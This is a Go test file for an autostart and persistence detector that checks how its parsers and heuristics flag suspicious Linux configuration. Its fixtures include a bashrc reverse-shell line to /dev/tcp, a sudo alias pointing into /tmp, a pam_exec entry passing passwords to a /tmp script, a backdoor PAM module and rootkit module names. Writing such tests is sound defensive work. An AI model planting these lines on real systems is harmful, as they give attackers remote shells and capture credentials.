package autoruns

import (
	"testing"

	"husmea/internal/core"
	"husmea/internal/heuristics"
)

func TestShellLines(t *testing.T) {
	rs, hits := assessShellLines([]string{
		"# ~/.bashrc",
		"alias ls='ls --color=auto'",
		"export PATH=$HOME/bin:$PATH",
		"alias sudo='/tmp/.s/sudo'",
		"(bash -i >& /dev/tcp/1.2.3.4/443 0>&1 &) 2>/dev/null",
	})
	if len(hits) != 2 || heuristics.MaxSeverity(rs) != core.Critical {
		t.Errorf("hits = %v reasons = %v", hits, rs)
	}
	if rs, _ := assessShellLines([]string{"[ -f ~/.bash_aliases ] && . ~/.bash_aliases", "PS1='\\u@\\h'"}); len(rs) != 0 {
		t.Errorf("benign rc flagged: %v", rs)
	}
}

func TestLinuxParsers(t *testing.T) {
	if got := parsePreload([]string{"# c", "/lib/x.so /usr/lib/y.so", "", "/tmp/z.so:/tmp/w.so"}); len(got) != 4 {
		t.Errorf("preload = %v", got)
	}
	d := parseDesktop([]string{"[Desktop Entry]", "Name=Upd", "Exec=/home/a/.x/run %U", "X-GNOME-Autostart-enabled=false", "[Desktop Action new]", "Exec=other"})
	if d.Name != "Upd" || d.Exec != "/home/a/.x/run %U" || d.Enabled {
		t.Errorf("desktop = %+v", d)
	}
	keys := parseAuthorizedKeys([]string{
		"ssh-ed25519 AAAAC3Nza bob@laptop",
		`command="/usr/bin/rrsync /backup",no-pty ssh-rsa AAAAB3Nza backup key`,
		"# comment",
		"garbage",
	})
	if len(keys) != 2 || keys[0].Comment != "bob@laptop" || keys[1].Type != "ssh-rsa" || cmdOption.FindStringSubmatch(keys[1].Options)[1] != "/usr/bin/rrsync /backup" {
		t.Errorf("keys = %+v", keys)
	}
	if runs := parseUdevRuns([]string{`ACTION=="add", RUN+="/tmp/x.sh"`, `# RUN+="/nope"`, `RUN{program}+="/usr/bin/y"`}); len(runs) != 2 || runs[0] != "/tmp/x.sh" {
		t.Errorf("udev = %v", runs)
	}
	pam := parsePAM([]string{
		"auth [success=1 default=ignore] pam_unix.so nullok",
		"auth optional pam_exec.so quiet expose_authtok /tmp/.log.sh",
		"@include common-auth",
		"auth required /usr/local/lib/pam_backdoor.so",
	})
	if len(pam) != 3 || pam[0].Module != "pam_unix.so" || pam[1].Module != "pam_exec.so" {
		t.Fatalf("pam = %+v", pam)
	}
	if rs := assessPAM(pam[0]); len(rs) != 0 {
		t.Errorf("pam_unix flagged: %v", rs)
	}
	if rs := assessPAM(pam[1]); heuristics.MaxSeverity(rs) < core.High {
		t.Errorf("pam_exec /tmp = %v", rs)
	}
	if rs := assessPAM(pam[2]); heuristics.MaxSeverity(rs) < core.High {
		t.Errorf("pam module outside security dir = %v", rs)
	}
	if !IsRootkitModule("Diamorphine") || IsRootkitModule("ext4") {
		t.Error("rootkit module names")
	}
}
